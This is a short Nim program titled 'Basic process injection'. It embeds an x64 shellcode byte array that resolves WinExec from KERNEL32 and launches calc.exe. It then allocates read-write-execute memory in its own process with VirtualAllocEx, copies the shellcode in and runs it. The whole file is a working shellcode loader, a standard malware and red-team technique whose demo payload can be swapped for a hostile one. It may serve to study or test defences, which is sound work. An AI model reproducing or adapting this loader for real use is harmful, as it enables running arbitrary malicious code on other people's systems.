#[ Basic process injection ]#
import winim

var buf: array[801, byte] = [
         byte 0x48, 0x83, 0xEC, 0x28, 0xE8, 0x87, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x0D, 0xF0, 0x02, 0x00, 
         0x00, 0x48, 0xB8, 0x4B, 0x45, 0x52, 0x4E, 0x45, 0x4C, 0x33, 0x32, 0xC7, 0x05, 0xE4, 0x02,
         0x00, 0x00, 0x2E, 0x64, 0x6C, 0x6C, 0x48, 0x89, 0x05, 0xD5, 0x02, 0x00, 0x00, 0x48, 0xB8,
         0x63, 0x61, 0x6C, 0x63, 0x2E, 0x65, 0x78, 0x65, 0xC7, 0x05, 0xD1, 0x02, 0x00, 0x00, 0x57, 
         0x69, 0x6E, 0x45, 0x66, 0xC7, 0x05, 0xCC, 0x02, 0x00, 0x00, 0x78, 0x65, 0xC6, 0x05, 0xC7,
         0x02, 0x00, 0x00, 0x63, 0x48, 0x89, 0x05, 0x9A, 0x02, 0x00, 0x00, 0xE8, 0x55, 0x00, 0x00,
         0x00, 0x48, 0x8D, 0x15, 0xAE, 0x02, 0x00, 0x00, 0x48, 0x89, 0xC1, 0x48, 0x89, 0x05, 0x64, 
         0x02, 0x00, 0x00, 0xE8, 0xFF, 0x00, 0x00, 0x00, 0x31, 0xD2, 0x48, 0x8D, 0x0D, 0x76, 0x02,
         0x00, 0x00, 0x48, 0x89, 0x05, 0x5F, 0x02, 0x00, 0x00, 0x48, 0x83, 0xC4, 0x28, 0xFF, 0xE0, 
         0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x48, 0x31, 0xC0, 0x58, 0x48, 0x83,
         0xE4, 0xF0, 0x48, 0x89, 0xE5, 0x48, 0x81, 0xEC, 0x00, 0x05, 0x00, 0x00, 0x50, 0xC3, 0x0F,
         0x0B, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x57, 0x56, 0x53, 0x48, 
         0x89, 0xCB, 0x48, 0x83, 0xEC, 0x20, 0xE8, 0x91, 0x00, 0x00, 0x00, 0x48, 0x8B, 0x40, 0x18,
         0x48, 0x8B, 0x78, 0x20, 0x66, 0x83, 0x7F, 0x48, 0x00, 0x74, 0x31, 0x45, 0x31, 0xC0, 0x48,
         0x85, 0xDB, 0x74, 0x0C, 0x42, 0x80, 0x3C, 0x03, 0x00, 0x74, 0x05, 0x49, 0xFF, 0xC0, 0xEB, 
         0xF4, 0x48, 0x8B, 0x57, 0x50, 0x41, 0xB9, 0x02, 0x00, 0x00, 0x00, 0x48, 0x89, 0xD9, 0xE8,
         0x6C, 0x01, 0x00, 0x00, 0x48, 0x85, 0xC0, 0x75, 0x06, 0x48, 0x8B, 0x47, 0x20, 0xEB, 0x47,
         0x48, 0x8B, 0x37, 0x48, 0x39, 0xFE, 0x74, 0x3D, 0x66, 0x83, 0x7E, 0x48, 0x00, 0x74, 0x31, 
         0x45, 0x31, 0xC0, 0x48, 0x85, 0xDB, 0x74, 0x0C, 0x42, 0x80, 0x3C, 0x03, 0x00, 0x74, 0x05,
         0x49, 0xFF, 0xC0, 0xEB, 0xF4, 0x48, 0x8B, 0x56, 0x50, 0x41, 0xB9, 0x02, 0x00, 0x00, 0x00,
         0x48, 0x89, 0xD9, 0xE8, 0x2C, 0x01, 0x00, 0x00, 0x48, 0x85, 0xC0, 0x75, 0x06, 0x48, 0x8B, 
         0x46, 0x20, 0xEB, 0x07, 0x48, 0x8B, 0x36, 0xEB, 0xBE, 0x31, 0xC0, 0x48, 0x83, 0xC4, 0x20,
         0x5B, 0x5E, 0x5F, 0xC3, 0x90, 0x90, 0x53, 0x48, 0x31, 0xDB, 0x48, 0x31, 0xC0, 0x65, 0x48, 
         0x8B, 0x1C, 0x25, 0x60, 0x00, 0x00, 0x00, 0x48, 0x89, 0xD8, 0x5B, 0xC3, 0x0F, 0x0B, 0x90,
         0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x66, 0x81, 0x39, 0x4D, 0x5A, 0x0F, 0x85, 
         0xDB, 0x00, 0x00, 0x00, 0x41, 0x57, 0x41, 0x56, 0x41, 0x55, 0x41, 0x54, 0x55, 0x57, 0x56,
         0x53, 0x48, 0x89, 0xCB, 0x48, 0x81, 0xEC, 0x08, 0x02, 0x00, 0x00, 0x48, 0x63, 0x71, 0x3C, 
         0x48, 0x01, 0xCE, 0x81, 0x3E, 0x50, 0x45, 0x00, 0x00, 0x0F, 0x85, 0x9C, 0x00, 0x00, 0x00,
         0x48, 0x83, 0xC6, 0x18, 0xB9, 0x3C, 0x00, 0x00, 0x00, 0x48, 0x89, 0xD5, 0x45, 0x31, 0xFF,
         0x48, 0x8D, 0xBC, 0x24, 0x10, 0x01, 0x00, 0x00, 0xF3, 0xA5, 0x48, 0x8D, 0x7C, 0x24, 0x20, 
         0x48, 0x8D, 0xB4, 0x24, 0x10, 0x01, 0x00, 0x00, 0xB9, 0x3C, 0x00, 0x00, 0x00, 0xF3, 0xA5,
         0x48, 0x63, 0xBC, 0x24, 0x90, 0x00, 0x00, 0x00, 0x48, 0x01, 0xDF, 0x4C, 0x63, 0x67, 0x20,
         0x4C, 0x63, 0x6F, 0x1C, 0x4C, 0x63, 0x77, 0x24, 0x49, 0x01, 0xDC, 0x49, 0x01, 0xDD, 0x49, 
         0x01, 0xDE, 0x44, 0x39, 0x7F, 0x14, 0x7E, 0x49, 0x49, 0x63, 0xC7, 0x45, 0x31, 0xC0, 0x49,
         0x63, 0x0C, 0x84, 0x41, 0x0F, 0xB7, 0x04, 0x46, 0x48, 0x01, 0xD9, 0x41, 0x8B, 0x74, 0x85, 
         0x00, 0x48, 0x85, 0xED, 0x74, 0x0D, 0x42, 0x80, 0x7C, 0x05, 0x00, 0x00, 0x74, 0x05, 0x49,
         0xFF, 0xC0, 0xEB, 0xF3, 0x41, 0xB9, 0x01, 0x00, 0x00, 0x00, 0x48, 0x89, 0xEA, 0xE8, 0x32,
         0x00, 0x00, 0x00, 0x48, 0x85, 0xC0, 0x75, 0x08, 0x48, 0x63, 0xC6, 0x48, 0x01, 0xD8, 0xEB, 
         0x07, 0x41, 0xFF, 0xC7, 0xEB, 0xB1, 0x31, 0xC0, 0x48, 0x81, 0xC4, 0x08, 0x02, 0x00, 0x00,
         0x5B, 0x5E, 0x5F, 0x5D, 0x41, 0x5C, 0x41, 0x5D, 0x41, 0x5E, 0x41, 0x5F, 0xC3, 0x31, 0xC0,
         0xC3, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x53, 0x49, 0x89, 0xCB, 0x49, 0x89, 0xD2, 
         0x48, 0x83, 0xEC, 0x20, 0x41, 0x0F, 0xB6, 0x0B, 0xE8, 0x3C, 0x00, 0x00, 0x00, 0x89, 0xCB,
         0x41, 0x0F, 0xB6, 0x0A, 0x41, 0x89, 0xC0, 0xE8, 0x2E, 0x00, 0x00, 0x00, 0x41, 0x38, 0xC0,
         0x74, 0x09, 0x41, 0x29, 0xC0, 0x41, 0x0F, 0xB6, 0xC0, 0xEB, 0x0E, 0x84, 0xDB, 0x74, 0x08, 
         0x49, 0xFF, 0xC3, 0x4D, 0x01, 0xCA, 0xEB, 0xCF, 0x31, 0xC0, 0x48, 0x83, 0xC4, 0x20, 0x5B,
         0xC3, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x8D, 0x51,
         0xBF, 0x89, 0xC8, 0x80, 0xFA, 0x19, 0x77, 0x03, 0x8D, 0x41, 0x20, 0xC3, 0x90, 0x90, 0x00, 
         0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
         0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
         0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
         0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
         0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
         0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
         0x00, 0x00, 0x00, 0x00, 0x00, 0x00
]

proc inject(bufPtr: ptr, size: int): void =
    let tProcess = GetCurrentProcessId()
    var procHandle: HANDLE = OpenProcess(PROCESS_ALL_ACCESS, FALSE, tProcess)

    let rPtr = VirtualAllocEx(
        procHandle,
        NULL,
        cast[SIZE_T](size),
        MEM_COMMIT,
        PAGE_EXECUTE_READ_WRITE
    )

    copyMem(rPtr, bufPtr, size)
    let f = cast[proc(){.nimcall.}](rPtr)
    f()

when isMainModule:
    const bufLen = buf.len
    var bufPtr = (cast[ptr array[bufLen, byte]](addr buf[0]))

    inject(bufPtr, bufLen)